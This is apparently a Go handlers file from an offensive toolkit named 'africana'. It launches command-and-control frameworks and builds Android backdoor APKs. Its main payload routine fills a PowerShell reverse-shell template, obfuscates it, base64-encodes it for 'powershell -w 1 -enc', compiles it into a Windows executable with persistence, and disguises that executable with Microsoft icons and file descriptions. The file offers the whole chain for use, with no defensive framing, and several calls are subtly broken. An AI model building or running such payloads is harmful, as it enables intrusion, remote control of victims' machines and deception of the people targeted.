package handlers

import(
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "bytes"
    "menus"
    "banners"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "unicode/utf16"
    "encoding/base64"
)

var(
    userC2       string
    userInput    string
    userTarget   string
    userLhost    string
    userLport    string
    userHport    string
    userIcon     string
    userMalware  string
    userScript   string
    userOutput   string
    userListener string
    scanner = bufio.NewScanner(os.Stdin)
    userLhostIp, _ = utils.GetDefaultIP()
)

func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
    fmt.Println()
}

func Shellz() {
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/windows/shells/; bash shells.sh`)
}

func SeaShell() {
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/mackos/seashell/; python3 sea_shell.py`)
}

func MeterPeter() {
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/windows/meterpeter/; pwsh meterpeter.ps1`)
}

func AndroRat() {
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana`)
        subprocess.Popen(`apt-get install /root/.africana/africana-base/exploits/android/androrat/zipalign_8.1.0.deb --allow-downgrades -y`)
    }

    userLhost, userLport, userMalware, userOutput := userLhostIp, "9999", "africana_malware", "/root/.africana/output/"
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "androids/androrat_c2.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoAndroRat()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.AndroRatMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.AndroRatOptions()
            AndroRat()
            return
        }
        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "lhost":
                if value == "" {
                    value = userLhostIp
                }
                userLhost = value
            case "lport":
                if value == "" {
                    value = "9999"
                }
                userLport = value
            case "build":
                if value == "" {
                    value = "africana_malware"
                }
                userMalware = value
            case "output":
                if value == "" {
                    value = "/root/.africana/output/"
                }
                userOutput = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", userLhost, userLport, userMalware, userOutput)
            subprocess.Popen(fmt.Sprintf("cd /root/.africana/africana-base/exploits/androids/androrat/; python3 androrat.py --build -i %s -p %s -o %s.apk", userLhost, userLport, userOutput + userMalware))
            subprocess.Popen(fmt.Sprintf("cd /root/.africana/africana-base/exploits/androids/androrat/; python3 androrat.py --shell -i %s -p %s", userLhost, userLport))
            continue
        }
        utils.SystemShell(userInput)
    }
}

func TearDroid() {
    userMalware, userOutput := "africana_teardroid_backdoor", "/root/.africana/output/"
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "androids/teardroid_c2.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoAndroRat()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.AndroRatMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.AndroRatOptions()
            TearDroid()
            return
        }

        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "build":
                if value == "" {
                    value = "africana_teardroid_backdoor"
                }
                userMalware = value
            case "output":
                if value == "" {
                    value = "/root/.africana/output/"
                }
                userOutput = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nBUILD => %s.apk\nOUTPUT => %s\n\n", userMalware, userOutput)
            subprocess.Popen(`cd /root/.africana/africana-base/exploits/androids/teardroid/; python3 Teardroid.py -b %s`, userMalware)
            continue
        }
        utils.SystemShell(userInput)
    }
}

func Chameleon() {
    userOutput, userMalware := "/root/.africana/output/", "chameleon_backdoor.txt"
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/chameleon_evasion.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoAndroRat()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.AndroRatMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.AndroRatOptions()
            TearDroid()
            return
        }

        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "build":
                if value == "" {
                    value = "chameleon_backdoor.txt"
                }
                userMalware = value
            case "output":
                if value == "" {
                    value = "/root/.africana/output/"
                }
                userOutput = value
            case "script":
                if value == "" {
                    fmt.Println(bcolors.ORANGE + "[!] " + bcolors.ENDC + "You must spacefie full path to the scrpt to be obfsicated!")
                    Chameleon()
                    return
                }
                userScript = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", userMalware, userScript, userOutput)
            subprocess.Popen(`cd /root/.africana/africana-base/exploits/windows/chameleon/; python3 chameleon.py -f -s --verbose %s -o %s`, userScript, userOutput + userMalware)
            continue
        }
        utils.SystemShell(userInput)
    }
}

func Gh0x0st() {
    userOutput, userMalware := "/root/.africana/output/", "obfuscated_backdoor.txt"
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/ghost_evasion.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoAndroRat()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.AndroRatMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.AndroRatOptions()
            TearDroid()
            return
        }

        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "build":
                if value == "" {
                    value = "obfuscated_backdoor.txt"
                }
                userMalware = value
            case "output":
                if value == "" {
                    value = "/root/.africana/output/"
                }
                userOutput = value
            case "script":
                if value == "" {
                    fmt.Println(bcolors.ORANGE + "[!] " + bcolors.ENDC + "You must spacefie full path to the scrpt to be obfsicated!")
                    Chameleon()
                    return
                }
                userScript = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", userMalware, userScript, userOutput)
            subprocess.Popen(`cd /root/.africana/africana-base/exploits/windows/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput + userMalware)
            continue
        }
        utils.SystemShell(userInput)
    }
}

func PowerJoker() {
    scanner := bufio.NewScanner(os.Stdin)
    //userLhost, userLport, userOutput, userMalware := "9999", "3333", "/root/.africana/output/", "obfuscated_backdoor.txt"
    userLhost, userLport := "9999", "3333"

    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/powerjoker_c2.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoBlackJack()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.BlackJackMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.BlackJackOptions()
            BlackJack()
            return
        }

        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "lhost":
                if value == "" {
                    value = userLhostIp
                }
                userLhost = value
            case "lport":
                if value == "" {
                    value = "9999"
                }
                userLport = value
            //case "build":
            //    if value == "" {
            //        value = "obfuscated_backdoor.txt"
            //    }
            //    userMalware = value
            //case "output":
            //    if value == "" {
            //        value = "/root/.africana/output/"
            //    }
            //    userOutput = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nLHOST => %s\nLPORT => %s\n\n", userLhost, userLport)
            subprocess.Popen(`cd /root/.africana/africana-base/exploits/windows/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
            continue
        }
        utils.SystemShell(userInput)
    }
}

func BlackJack() {
    scanner := bufio.NewScanner(os.Stdin)
    userLhost, userLport, userHport, userListener := userLhostIp, "9999", "3333", "tcp"
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "src/handlers/windows/blackjack.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoBlackJack()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.BlackJackMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.BlackJackOptions()
            BlackJack()
            return
        }

        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "lhost":
                if value == "" {
                    value = userLhostIp
                }
                userLhost = value
            case "lport":
                if value == "" {
                    value = "9999"
                }
                userLport = value
            case "hport":
                if value == "" {
                    value = "3333"
                }
                userHport = value
            case "listener":
                if value == "" {
                    value = "tcp"
                }
                userListener = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nLISTENER => %s\n", userLhost, userLport, userHport, userListener)
            
            if userListener == "tcp" {
                fmt.Println()
                subprocess.Popen(fmt.Sprintf("cd /root/.africana/africana-base/exploits/windows/blackjack/; python3 blackjack.py -q -i -n %s", userLport))
                fmt.Println()
            } else if userListener == "http" || userListener == "https" {
                fmt.Println()
                subprocess.Popen(fmt.Sprintf("cd /root/.africana/africana-base/exploits/windows/blackjack/; python3 blackjack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s", userLport, userHport))
                fmt.Println()
            } else {
                fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid listener type")
            }
            continue
        }
        utils.SystemShell(userInput)
    }
}

func ShikataGanai() {
    scanner := bufio.NewScanner(os.Stdin)
    userLhost, userLport, userHport, userListener, userIcon, userC2 := userLhostIp, "9999", "3333", "tcp", "vlc", "blackjack"
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/shikata_ga_nai.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoBlackJack()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.BlackJackMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.BlackJackOptions()
            BlackJack()
            return
        }

        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "lhost":
                if value == "" {
                    value = userLhostIp
                }
                userLhost = value
            case "lport":
                if value == "" {
                    value = "9999"
                }
                userLport = value
            case "hport":
                if value == "" {
                    value = "3333"
                }
                userHport = value
            case "listener":
                if value == "" {
                    value = "tcp"
                }
                userListener = value
            case "icon":
                if value == "" {
                    value = "vlc"
                }
                userIcon = value
            case "c2":
                if value == "" {
                    value = "blackjack"
                }
                userC2 = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nICON => %s\nLISTENER => %s\n", userLhost, userLport, userHport, userIcon, userListener)
            if userListener == "tcp" {
                subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/windows/payload_templates/ncat_exploits/powershell_reverse_tcp.ps1 /root/.africana/output/powershell_reverse_tcp.txt`)
                filesToReplacements := map[string]map[string]string{
                    "/root/.africana/output/powershell_reverse_tcp.txt": {
                    `*LHOST*`: userLhost,
                    `*LPORT*`: userLport,
                    },
                }
                fmt.Println()
                utils.Editors(filesToReplacements)
                userScript := `/root/.africana/output/powershell_reverse_tcp.txt`
                userOutput := `/root/.africana/output/powershell_reverse_tcp.ps1`
                subprocess.Popen(`cd /root/.africana/africana-base/exploits/windows/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)

                filePath := "/root/.africana/output/powershell_reverse_tcp.ps1"
                content, err := ioutil.ReadFile(filePath)
                if err != nil {
                    fmt.Printf("Error reading file: %v\n", err)
                    return
                }

                utf16Content := utf16.Encode([]rune(string(content)))
                buf := new(bytes.Buffer)
                for _, v := range utf16Content {
                    buf.Write([]byte{byte(v), byte(v >> 8)})
                }

                encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
                subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/windows/payload_templates/go_exploits/malware_complete.go /root/.africana/output/malware_complete.go`)
                Replacement := map[string]map[string]string{
                    "/root/.africana/output/malware_complete.go": {
                    `africana`: encoded,
                    },
                }
                utils.Editors(Replacement)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Obfsicating powershell payload & encoding to base64...\n" + bcolors.DARKGREY + `powershell -w 1 -enc "%s"` + "\n" + bcolors.ENDC , encoded)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Combiling base64 payload with persistence mechanisim...\n" + bcolors.DARKGREY)
                subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -v -x -o /root/.africana/output/malware_complete.exe /root/.africana/output/malware_complete.go`)
                IconChanger(userIcon)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %s c2...\n\n", userC2)
                ListenerTcp(userC2 , userLhostIp, userLport, userHport)
                fmt.Println()

            } else if userListener == "http" || userListener == "https" {
                subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/windows/payload_templates/ncat_exploits/powershell_reverse_http.ps1 /root/.africana/output/powershell_reverse_http.txt`)
                filesToReplacements := map[string]map[string]string{
                    "/root/.africana/output/powershell_reverse_http.txt": {
                    `*LHOST*`: userLhost,
                    `*LPORT*`: userLport,
                    },
                }
                fmt.Println()
                utils.Editors(filesToReplacements)
                userScript := `/root/.africana/output/powershell_reverse_http.txt`
                userOutput := `/root/.africana/output/powershell_reverse_http.ps1`
                subprocess.Popen(`cd /root/.africana/africana-base/exploits/windows/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)

                filePath := "/root/.africana/output/powershell_reverse_http.ps1"
                content, err := ioutil.ReadFile(filePath)
                if err != nil {
                    fmt.Printf("Error reading file: %v\n", err)
                    return
                }

                utf16Content := utf16.Encode([]rune(string(content)))
                buf := new(bytes.Buffer)
                for _, v := range utf16Content {
                    buf.Write([]byte{byte(v), byte(v >> 8)})
                }

                encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
                subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/windows/payload_templates/go_exploits/malware_complete.go /root/.africana/output/malware_complete.go`)
                filesToReplace := map[string]map[string]string{
                    "/root/.africana/output/malware_complete.go": {
                    `africana`: encoded,
                    },
                }
                utils.Editors(filesToReplace)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Obfsicating powershell payload & encoding to base64...\n" + bcolors.DARKGREY + `powershell -w 1 -enc "%s"` + "\n" + bcolors.ENDC , encoded)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Combiling base64 payload with persistence mechanisim...\n" + bcolors.DARKGREY)
                subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -v -x -o /root/.africana/output/malware_complete.exe /root/.africana/output/malware_complete.go`)
                IconChanger(userIcon)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %s c2...\n\n", userC2)
                ListenerHttp(userC2 , userLhostIp, userLport, userHport)
                fmt.Println()
            } else {
                fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid listener type. Use tcp or http/https")
            }
            continue
        }
        utils.SystemShell(userInput)
    }
}

func IconChanger(userIcon string) {
    if userIcon == "" {
        userIcon = ""
        }
    switch strings.ToLower(userIcon) {
    case "lync":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/lync.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "excel":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/excel.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "access":
